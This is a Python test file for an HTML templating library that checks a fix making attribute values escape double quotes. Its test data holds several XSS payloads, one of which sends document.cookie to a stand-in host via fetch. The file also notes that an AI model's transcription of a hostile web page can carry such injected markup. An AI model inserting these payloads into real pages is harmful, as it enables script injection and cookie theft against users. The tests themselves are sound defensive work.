"""The escaper, and the hole that was in it.

Twelve placeholders in these templates sit inside HTML attributes. The renderer
used to call ``html.escape(..., quote=False)``, which leaves a bare ``"`` alone,
so a value could close the attribute it was placed in and open an event handler
instead. These tests pin the fix at the layer it belongs to rather than at the
twelve call sites, because the next attribute somebody adds will not be reviewed.

The injection path worth naming is the third one. ``status_text`` is a model's
transcription of a tracking page somebody photographed, and ``guard.py`` has
opinions about accusations, not about punctuation. Model output is third-party
input.
"""

from __future__ import annotations

import html

import pytest

from doorstep_receipt.templating import MissingTemplateValue, render_string

ATTACK = '" autofocus onfocus=alert(document.domain) x="'


def test_a_quote_cannot_escape_the_attribute_it_was_placed_in():
    out = render_string('<input value="{{query}}">', query=ATTACK)

    assert out == '<input value="&quot; autofocus onfocus=alert(document.domain) x=&quot;">'
    # Exactly the two quotes the template itself wrote, so the attribute the
    # value was placed in is still the attribute it is in.
    assert out.count('"') == 2


@pytest.mark.parametrize(
    "payload",
    [
        ATTACK,
        '"><script>alert(1)</script>',
        "' onmouseover='alert(1)",
        '<img src=x onerror=alert(1)>',
    ],
)
def test_no_payload_survives_into_an_attribute_as_markup(payload):
    out = render_string('<input value="{{v}}">', v=payload)

    # Exactly two unescaped quotes: the ones the template itself wrote.
    assert out.count('"') == 2
    assert "<script" not in out
    assert "<img" not in out


def test_the_model_transcription_path_is_covered_by_the_same_escape():
    """A hostile tracking page, transcribed faithfully, and stored."""
    status_text = 'Delivered " autofocus onfocus=fetch("//x/"+document.cookie) x="'

    out = render_string('<input name="status_text" value="{{status_text}}">',
                        status_text=status_text)

    assert "onfocus=" not in html.unescape(out).replace(status_text, "")
    assert out.count('"') == 4  # name="..." and value="..."


def test_text_nodes_still_read_normally():
    """&quot; renders as " to a reader, so the fix changes nothing visible."""
    out = render_string("<p>{{v}}</p>", v='She said "hello".')

    assert html.unescape(out) == '<p>She said "hello".</p>'


def test_the_html_suffix_still_opts_out():
    out = render_string("<div>{{body_html}}</div>", body_html="<b>kept</b>")

    assert out == "<div><b>kept</b></div>"


def test_a_missing_key_raises_rather_than_leaving_a_blank_field():
    with pytest.raises(MissingTemplateValue):
        render_string("<p>{{absent}}</p>")
